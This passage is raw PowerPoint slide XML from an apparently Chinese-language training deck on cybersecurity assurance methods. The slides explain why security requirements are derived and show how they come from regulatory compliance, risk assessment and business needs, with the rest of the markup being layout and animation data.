        <p:spPr>
          <a:xfrm>
            <a:off x="773558" y="836712"/>
            <a:ext cx="7470849" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障工作方法</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50180" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884957" y="1628800"/>
            <a:ext cx="7089502" cy="1692027"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>知识子域：确定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>安全需求</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>解确定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>安全保障需求的作用</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>解确定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>安全保障需求的方法和原则</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22472435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80">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="501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8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0180">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5018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180">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0180">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5018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018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538589" y="899293"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>为什么要提取网络空间安全需求</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51203" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="2420888"/>
            <a:ext cx="8191500" cy="2016224"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>准确地提取安全需求</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>一方面可以保证安全措施可以全面覆盖信息系统面临的风险，是安全防护能力达到业务目标和法规政策的要求的基础</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>另一方面可以提高安全措施的针对性，避免不必要的安全投入，防止浪费</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="540137" y="1700808"/>
            <a:ext cx="8280335" cy="461665"/>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dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络空间安全需求是安全方案设计和安全措施实施的依据</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33765741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3">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5120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0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1203">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5120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120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1203">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5120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120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P spid="2"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下箭头标注 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1382688" y="2420888"/>
            <a:ext cx="5616624" cy="2138088"/>
          </a:xfrm>
          <a:prstGeom prst="downArrowCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 25000"/>
              <a:gd name="adj2" fmla="val 25572"/>
              <a:gd name="adj3" fmla="val 25000"/>
              <a:gd name="adj4" fmla="val 6497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228" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1583732" y="4558976"/>
            <a:ext cx="5166712" cy="672901"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="E3F1FF"/>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr algn="ctr">
              <a:defRPr sz="1800" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>信息系统安全保障需求描述”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52229" name="AutoShape 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5343128" y="2747602"/>
            <a:ext cx="1538287" cy="649288"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="E3F1FF"/>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>风险评估</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52230" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="839138" y="1544954"/>
            <a:ext cx="46714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mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>确定信息系统安全保障具体需求 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52231" name="标题 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="730250" y="862024"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>如何制定网络空间安全保障需求</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52233" name="AutoShape 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1433616" y="2747602"/>
            <a:ext cx="1538287" cy="649288"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="E3F1FF"/>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>法规符合性</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="AutoShape 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3397945" y="2747602"/>
            <a:ext cx="1538287" cy="649288"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="E3F1FF"/>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>业务需求</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8340259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2229"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52229"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52229"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52229"/>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52233"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52233"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52233"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52233"/>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53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="52228"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52228"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52228"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52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2228" grpId="0" animBg="1"/>
      <p:bldP spid="52229" grpId="0" animBg="1"/>
      <p:bldP spid="52233" grpId="0" animBg="1"/>
      <p:bldP spid="10"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8776" y="692696"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全需求的制定流程</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="Group 3"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4950841" y="5607460"/>
            <a:ext cx="838200" cy="581025"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="730" cy="505"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="120" name="Rectangle 4"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="730" cy="505"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFCC66"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="121" name="Rectangle 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="29" y="32"/>
              <a:ext cx="669" cy="441"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="122" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="298" y="362"/>
              <a:ext cx="130" cy="129"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 102"/>
                <a:gd name="T1" fmla="*/ 4375 h 109"/>
                <a:gd name="T2" fmla="*/ 2232 w 102"/>
                <a:gd name="T3" fmla="*/ 2825 h 109"/>
                <a:gd name="T4" fmla="*/ 6546 w 102"/>
                <a:gd name="T5" fmla="*/ 1457 h 109"/>
                <a:gd name="T6" fmla="*/ 13585 w 102"/>
                <a:gd name="T7" fmla="*/ 379 h 109"/>
                <a:gd name="T8" fmla="*/ 23279 w 102"/>
                <a:gd name="T9" fmla="*/ 0 h 109"/>
                <a:gd name="T10" fmla="*/ 32672 w 102"/>
                <a:gd name="T11" fmla="*/ 0 h 109"/>
                <a:gd name="T12" fmla="*/ 42251 w 102"/>
                <a:gd name="T13" fmla="*/ 379 h 109"/>
                <a:gd name="T14" fmla="*/ 49322 w 102"/>
                <a:gd name="T15" fmla="*/ 1457 h 109"/>
                <a:gd name="T16" fmla="*/ 53849 w 102"/>
                <a:gd name="T17" fmla="*/ 2825 h 109"/>
                <a:gd name="T18" fmla="*/ 55974 w 102"/>
                <a:gd name="T19" fmla="*/ 4375 h 109"/>
                <a:gd name="T20" fmla="*/ 53849 w 102"/>
                <a:gd name="T21" fmla="*/ 5809 h 109"/>
                <a:gd name="T22" fmla="*/ 49322 w 102"/>
                <a:gd name="T23" fmla="*/ 7252 h 109"/>
                <a:gd name="T24" fmla="*/ 42251 w 102"/>
                <a:gd name="T25" fmla="*/ 8390 h 109"/>
                <a:gd name="T26" fmla="*/ 32672 w 102"/>
                <a:gd name="T27" fmla="*/ 8703 h 109"/>
                <a:gd name="T28" fmla="*/ 23279 w 102"/>
                <a:gd name="T29" fmla="*/ 8703 h 109"/>
                <a:gd name="T30" fmla="*/ 13585 w 102"/>
                <a:gd name="T31" fmla="*/ 8390 h 109"/>
                <a:gd name="T32" fmla="*/ 6546 w 102"/>
                <a:gd name="T33" fmla="*/ 7252 h 109"/>
                <a:gd name="T34" fmla="*/ 2232 w 102"/>
                <a:gd name="T35" fmla="*/ 5809 h 109"/>
                <a:gd name="T36" fmla="*/ 0 w 102"/>
                <a:gd name="T37" fmla="*/ 4375 h 1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2"/>
                <a:gd name="T58" fmla="*/ 0 h 109"/>
                <a:gd name="T59" fmla="*/ 102 w 102"/>
                <a:gd name="T60" fmla="*/ 109 h 10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2" h="109">
                  <a:moveTo>
                    <a:pt x="0" y="54"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="90" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="98" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102" y="54"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="98" y="73"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="90" y="90"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="104"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
